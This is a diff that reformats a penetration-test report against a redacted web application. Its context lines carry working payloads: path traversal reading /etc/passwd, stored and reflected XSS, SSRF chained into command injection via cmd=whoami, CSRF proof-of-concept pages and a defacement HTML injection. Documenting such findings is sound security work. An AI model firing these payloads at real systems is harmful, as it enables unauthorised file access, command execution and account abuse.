@@ -123,8 +123,7 @@ can read any file readable by the web server, including /etc/passwd,
   data_source=\....%2F%2F\....%2F%2F\....%2F%2Fetc%2Fpasswd
 ```
   -----------------------------------------------------------------------
-
-  -----------------------------------------------------------------------
+  
 
 ### **2. Stored Cross-Site Scripting in Profile Bio**
 
@@ -172,7 +171,7 @@ HTML escaping, allowing injection of HTML and JavaScript.
 **Example HTTP Request**
 
   -----------------------------------------------------------------------
-  POST /profile HTTP/2\
+  ```POST /profile HTTP/2\
   Host: **\[TARGET-REDACTED\]**\
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
   Firefox/128.0\
@@ -194,27 +193,9 @@ HTML escaping, allowing injection of HTML and JavaScript.
   Te: trailers\
   \
   username=AggroSec&bio=%3Cimg+src%3Dx+onerror%3Dalert%281%29%3E
+```
   -----------------------------------------------------------------------
 
-  -----------------------------------------------------------------------
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
 
 ### **3. Reflected Cross-Site Scripting via Search Parameter**
 
@@ -257,7 +238,7 @@ onmouseover).
 **Example HTTP Request**
 
   --------------------------------------------------------------------------
-  GET
+  ```GET
   /search?search_term=%22+onmouseover%3Dalert%28document.domain%29+x%3D%22
   HTTP/2\
   Host: **\[TARGET-REDACTED\]**\
@@ -275,15 +256,9 @@ onmouseover).
   X-Candidate-Email: **\[REDACTED_EMAIL\]**\
   Priority: u=0, i\
   Te: trailers
+```
   --------------------------------------------------------------------------
-
-  --------------------------------------------------------------------------
-
-### 
-
-### 
-
-### 
+ 
 
 ### **4. Server-Side Request Forgery + Path Traversal in PDF Generation**
 
@@ -338,7 +313,7 @@ Error messages leak the tool name and version.
 **Example HTTP Request**
 
   -----------------------------------------------------------------------
-  **POST /pdf HTTP/2\
+  ```POST /pdf HTTP/2\
   \
   Host: \[TARGET-REDACTED\]\
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
@@ -360,22 +335,11 @@ Error messages leak the tool name and version.
   Priority: u=0, i\
   Te: trailers\
   \
-  url=https://google.com**
-  -----------------------------------------------------------------------
+  url=https://google.com
+```
 
   -----------------------------------------------------------------------
 
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
 
 ### **5. SSRF to Localhost Admin Panel with Command Injection**
 
@@ -428,7 +392,7 @@ enabling arbitrary command execution as the nobody user.
 **Python Code Snip**
 
   -----------------------------------------------------------------------
-  \@app.route(\"/admin\", methods=\[\"GET\"\])\
+  ```\@app.route(\"/admin\", methods=\[\"GET\"\])\
   def admin():\
   if request.remote_addr not in \[\"127.0.0.1\", \"localhost\",
   \"::1\"\]:\
@@ -443,8 +407,7 @@ enabling arbitrary command execution as the nobody user.
   output = f\"Command failed: {e}\"\
   return render_template(\"admin.html\", output=output)\
   return render_template(\"admin.html\", output=\"\")
-  -----------------------------------------------------------------------
-
+```
   -----------------------------------------------------------------------
 
 **Screenshots**
@@ -454,7 +417,7 @@ enabling arbitrary command execution as the nobody user.
 **Example HTTP Request**
 
   -----------------------------------------------------------------------
-  **POST /pdf HTTP/2\
+  ```POST /pdf HTTP/2\
   Host: \[TARGET-REDACTED\]\
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
   Firefox/128.0\
@@ -475,46 +438,10 @@ enabling arbitrary command execution as the nobody user.
   Priority: u=0, i\
   Te: trailers\
   \
-  url=http://127.0.0.1/admin?cmd=whoami**
+  url=http://127.0.0.1/admin?cmd=whoami
+```
   -----------------------------------------------------------------------
 
-  -----------------------------------------------------------------------
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
 
 ### **6. Cross-Site Request Forgery on Profile Update**
 
@@ -552,7 +479,7 @@ injecting malicious bio content.
 **PoCs**
 
   -----------------------------------------------------------------------
-  **CSRF test\
+  ```CSRF test\
   \<!DOCTYPE html\>\
   \<html\>\
   \<head\>\<title\>CSRF Pure PoC\</title\>\</head\>\
@@ -568,13 +495,10 @@ injecting malicious bio content.
   document.getElementById(\"csrf\").submit();\
   \</script\>\
   \</body\>\
-  \</html\>**
+  \</html\>
+```
   -----------------------------------------------------------------------
-
-  -----------------------------------------------------------------------
-
-  -----------------------------------------------------------------------
-  **CSRF chained with XSS\
+  ```CSRF chained with XSS\
   \<!DOCTYPE html\>\
   \<html\>\
   \<body\>\
@@ -586,13 +510,10 @@ injecting malicious bio content.
   \</form\>\
   \<script\>document.getElementById(\"chain\").submit();\</script\>\
   \</body\>\
-  \</html\>**
+  \</html\>
+```
   -----------------------------------------------------------------------
-
-  -----------------------------------------------------------------------
-
-  -----------------------------------------------------------------------
-  Silent Version\
+ ``` Silent Version\
   \<!DOCTYPE html\>\
   \<**html**\>\
   \<**head**\>\
@@ -619,23 +540,12 @@ injecting malicious bio content.
   \</**script**\>\
   \</**body**\>\
   \</**html**\>
-  -----------------------------------------------------------------------
-
+```
   -----------------------------------------------------------------------
 
 **Screenshots**
 
 \[REMOVED\]
-
-### 
-
-### 
-
-### 
-
-### 
-
-### 
 
 ### **7. HTML Injection in Profile Bio (Medium)**
 
@@ -673,7 +583,7 @@ enabling defacement and potential phishing.
 **Example HTTP Request**
 
   -----------------------------------------------------------------------
-  **POST /profile HTTP/2\
+  ```POST /profile HTTP/2\
   Host: \[TARGET-REDACTED\]\
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101
   Firefox/128.0\
@@ -694,9 +604,8 @@ enabling defacement and potential phishing.
   Priority: u=0, i\
   Te: trailers\
   \
-  username=AggroSec&bio=%3Ch1%3EHACKED+by+AggroSec%3C%2Fh1%3E**
-  -----------------------------------------------------------------------
-
+  username=AggroSec&bio=%3Ch1%3EHACKED+by+AggroSec%3C%2Fh1%3E
+```
   -----------------------------------------------------------------------
 
 ## Conclusion
